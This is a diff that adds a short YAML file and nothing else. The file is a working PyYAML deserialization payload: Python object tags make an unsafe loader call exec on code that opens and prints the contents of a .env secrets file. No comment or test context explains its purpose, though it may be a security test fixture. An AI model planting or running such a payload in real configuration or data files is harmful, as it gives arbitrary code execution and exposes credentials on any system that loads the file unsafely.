@@ -1,0 +1,6 @@
+!!python/object/new:str
+state: !!python/tuple
+- 'print(getattr(open(".env"), "read")())'
+- !!python/object/new:Warning
+  state:
+    update: !!python/name:exec
